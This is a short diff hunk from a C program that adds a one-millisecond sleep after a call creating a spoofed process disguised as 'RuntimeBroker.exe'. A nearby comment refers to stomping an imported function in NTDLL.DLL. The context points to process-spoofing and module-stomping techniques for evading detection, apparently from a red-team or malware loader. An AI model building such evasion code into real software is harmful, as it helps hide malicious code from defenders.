@@ -19,6 +19,7 @@ int main()
 	HANDLE hThread = NULL;
 	LPWSTR sCreate = "RuntimeBroker.exe";
 	CreateSpoofedProcess(hParent, sCreate, &dwProcessID, &hProcess, &hThread);
+	Sleep(1);
 	
 	// Stomp an imported function within spoofed process
 	LPCWSTR sStompModule = L"NTDLL.DLL";
